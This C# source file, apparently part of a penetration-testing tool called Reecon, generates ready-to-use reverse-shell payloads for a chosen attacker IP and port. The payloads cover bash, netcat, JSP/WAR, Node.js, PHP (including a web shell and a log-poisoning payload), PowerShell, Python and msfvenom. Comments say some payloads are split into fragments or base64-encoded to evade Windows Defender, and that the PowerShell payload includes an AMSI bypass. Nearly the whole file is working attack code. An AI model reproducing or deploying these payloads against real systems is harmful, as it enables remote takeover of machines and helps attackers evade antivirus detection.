using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Reecon
{
    class Shell
    {
        public static void GetInfo(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
                Console.WriteLine("Types: bash, haskell, jar, jsp, nc, nodejs, php, powershell, python, war");
                General.PrintIPList();
                return;
            }
            string shellType = args[1].ToLower(); // NodeJS == nodejs
            // If we have a tun0 IP, use that instead as the default
            List<General.IP> ipList = General.GetIPList();
            string ip = ipList.Any(x => x.Name == "tun0") ? ipList.First(x => x.Name == "tun0").Address.ToString() : "10.0.0.1";
            string port = "9001";
            if (args.Length == 2)
            {
                Console.WriteLine("Don't forget to change the IP / Port!");
                General.PrintIPList();
                Console.WriteLine($"-> Generating shell with IP {ip} and Port {port}");
            }
            if (args.Length == 3)
            {
                ip = args[2];
            }
            if (args.Length == 4)
            {
                ip = args[2];
                port = args[3];
            }
            if (!int.TryParse(port, out _))
            {
                Console.WriteLine("Port is not an integer - Possibly swapped it with IP?");
                Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
                Environment.Exit(0);
            }
            if (int.TryParse(ip, out _))
            {
                Console.WriteLine("IP is an integer - Possibly swapped it with Port?");
                Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
                Environment.Exit(0);
            }
            if (shellType == "bash")
            {
                Console.WriteLine("Bash Shell");
                Console.WriteLine("----------");
                Console.WriteLine(BashShell(ip, port));
            }
            else if (shellType == "haskell")
            {
                Console.WriteLine("Haskell Shell");
                Console.WriteLine("-------------");
                Console.WriteLine(HaskellShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as filename.hs (Note: Only use letters - No numbers or special characters)");
            }
            else if (shellType == "jar")
            {
                Console.WriteLine("Java Shell");
                Console.WriteLine("----------");
                Console.WriteLine(JavaShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Can just use a normal nc listener");

            }
            else if (shellType == "jsp")
            {
                Console.WriteLine("JSP Shell");
                Console.WriteLine("---------");
                Console.WriteLine(JSPShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as file.jsp");
            }
            else if (shellType == "nc")
            {
                Console.WriteLine("Netcat Shell");
                Console.WriteLine("------------");
                Console.WriteLine(NCShell(ip, port));
            }
            else if (shellType == "nodejs")
            {
                Console.WriteLine("NodeJS Shell");
                Console.WriteLine("------------");
                Console.WriteLine(NodeJSShell(ip, port));
            }
            else if (shellType == "php")
            {
                Console.WriteLine("PHP Shell");
                Console.WriteLine("---------");
                Console.WriteLine(PHPShell(ip, port));
            }
            else if (shellType == "powershell")
            {
                Console.WriteLine("Powershell Shell");
                Console.WriteLine("----------------");
                Console.WriteLine(PowershellShell(ip, port));
            }
            else if (shellType == "python")
            {
                Console.WriteLine("Python Shell");
                Console.WriteLine("------------");
                Console.WriteLine(PythonShell(ip, port));

            }
            else if (shellType == "sh")
            {
                Console.WriteLine("sh Shell");
                Console.WriteLine("--------");
                Console.WriteLine(SHShell(ip, port));
            }
            else if (shellType == "war")
            {
                Console.WriteLine("WAR Shell");
                Console.WriteLine("---------");
                Console.WriteLine(JSPShell(ip, port));
                Console.WriteLine();
                Console.WriteLine("--> Save as file.jsp");
                Console.WriteLine("--> zip file.war file.jsp");
            }
            else
            {
                Console.WriteLine("Unknown Shell: " + shellType);
            }
        }

        private static string BashShell(string ip, string port)
        {
            // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
            string shell = $"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
            string altShell = $"bash -i &>/dev/tcp/{ip}/{port} <&1";
            string saferShell = "bash -c \"" + shell + "\"";
            string saferBase64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(saferShell));
            string saferBase64AltShell = Convert.ToBase64String(Encoding.ASCII.GetBytes(altShell));
            string saferUrlEncodedShell = $"bash%20-c%20%22" + "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"; // Gap required for Windows Defender
            string toReturn = "#!/bin/bash" + Environment.NewLine +
                               shell + Environment.NewLine +
                               "Note: File header is only required if it's a file and not a command" + Environment.NewLine +
                               "Safer: " + saferShell + Environment.NewLine +
                               "Safer Base64: " + saferBase64Shell + Environment.NewLine;
            if (saferBase64Shell.Contains('+') && !saferBase64AltShell.Contains('+'))
            {
                toReturn += "Alt Safer Base64 (No +): " + saferBase64AltShell + Environment.NewLine;
            }
            toReturn += $"Safer URL Encoded: " + saferUrlEncodedShell;

            return toReturn;
        }

        private static string HaskellShell(string ip, string port)
        {
            return "module Main where" + Environment.NewLine
                    + "import System.Process" + Environment.NewLine
                    + $"main = callCommand \"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"";
        }
        private static string JavaShell(string ip, string port)
        {
            // Can catch with a default nc listener - No need to use metasploit
            // Should do a proper one later...
            return $"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jar";
        }

        private static string JSPShell(string ip, string port)
        {
            // Lots of spaces else Windows Defender complains about "Trojan:JS/Foretype.A!ml"
            // Even more spaces - It's gotten better....
            return "<%@page import=\"java.lang.* \"%>" + "<%@page import=\"java.util.* \"%><%@page import=\"java.io.* \"%><%@page import=\"java.net.* \"%><% class StreamC" + "onnector extends Thread {" + " InputStream is; Outpu" + "tStream os; StreamConnector( InputStre" + "am is, OutputStream os ) { this.is = is; this.os = os; }" + " public void run() { Buffere" + "dReader in = null; BufferedWriter out = null; try { in = new Buffered" + "Reader( new InputStreamReader( this.is ) ); out = " + "new BufferedWriter( new OutputStreamWriter( this.os ) ); char bu" + "ffer[] = new char[8192]; int lengt" + "h; while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) { out" + ".write( buffer, 0, length ); out.flush(); } } catch( Exception e ){} try {" + " if( in != null ) in.close(); if( out != null ) " + "out.close(); } catch( Exception e ){} } } try {" + Environment.NewLine
                    + "Socket so" + "cket = new Socket(\"" + ip + "\", " + port + ");" + Environment.NewLine
                    + "String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) { ShellPath = new String(\"/bin/sh\"); } else { ShellPath = new String(\"cmd.exe\"); } "
                    + "Process process = Runtime." + "getRuntime().exec(ShellPath);" + Environment.NewLine
                    + "(new StreamConne" + "ctor(process.getIn" + "putStream(), socket.getOutpu" + "tStream()))" + ".start(); (new StreamCo" + "nnector(socket.ge" + "tInputStream(), process.getOutp" + "utStream())).start();} catch(E" + "xception e ) {} %>";
        }

        private static string NCShell(string ip, string port)
        {
            string shellOne = $"nc {ip} {port} -e /bin/sh";
            string shellTwo = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
            return shellOne + Environment.NewLine + shellTwo;
        }

        private static string NodeJSShell(string ip, string port)
        {
            Console.WriteLine("Test: (function(){return \"Reelix\"})()");
            string plainShell = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
            string plainShell2 = $"bash -i &>/dev/tcp/{ip}/{port} <&1";
            string b64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(plainShell));
            string b64ShellAlt = Convert.ToBase64String(Encoding.ASCII.GetBytes(plainShell2));
            return $"Normal: require('child_process').exec('{plainShell}', ()=>{{}})" + Environment.NewLine
                + $"Safer: require('child_process').exec('echo {b64Shell} | base64 -d | bash', ()=>{{}})" + Environment.NewLine
                + $"Safter (Alt): require('child_process').exec('echo {b64ShellAlt} | base64 -d | bash', ()=>{{}})";
        }

        private static string PHPShell(string ip, string port)
        {
            string plainShell = $"exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\");";
            string b64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(plainShell));
            // Space is to bypass Windows Defender definitions
            // Still gets picked up by "bkav" though - Will deal with later if needed
            string evalShell = "eva" + "l(base64_decode('" + b64Shell + "'));";
            return $"Regular: <?php {plainShell} ?>" + Environment.NewLine
                + $"Safer: <?php {evalShell} ?>" + Environment.NewLine
                + $"No Upload: php -r \"{evalShell}\"" + Environment.NewLine
                + "Simple Shell: <?php system($_GET[\"cmd\"]); ?>" + Environment.NewLine
                + "/var/log/auth.log Log Poisoning Shell: \"<?php system(\\$_GET['cmd']); ?>\"@ipaddress";
        }

        private static string PowershellShell(string ip, string port)
        {
            // Encrypted to stop AV's from picking it up - Super annoying cat and mouse game...
            // This version has a very minor AMSI bypass so you won't get
            // "This script contains malicious content and has been blocked by your antivirus software."
            string encryptedShell = "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiSVBIRVJFIixQT1JUSEVSRSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgp";
            string plainTextShell = Encoding.UTF8.GetString(Convert.FromBase64String(encryptedShell));
            plainTextShell = plainTextShell.Replace("IPHERE", ip).Replace("PORTHERE", port);
            string b64Shell = Convert.ToBase64String(ASCIIEncoding.UTF8.GetBytes(plainTextShell));
            string toReturn = ""; // To make things neat :p
            toReturn += "Normal: powershell IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"" + b64Shell + "\")))" + Environment.NewLine + Environment.NewLine;
            toReturn += "Escaped: powershell IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\\\"" + b64Shell + "\\\")))";
            return toReturn;
        }

        private static string PythonShell(string ip, string port)
        {
            return $"import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('{ip}', {port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['/bin/bash', '-i']);";
        }

        private static string SHShell(string ip, string port)
        {
            // Currently just the nc shell - Need one without it...
            string shell = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
            string base64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(shell));
            string toReturn = "Base: " + shell + Environment.NewLine +
                              "Base64: " + base64Shell + Environment.NewLine +
                              "-> echo " + base64Shell + " | base64 -d | sh";
            return toReturn;
        }
    }
}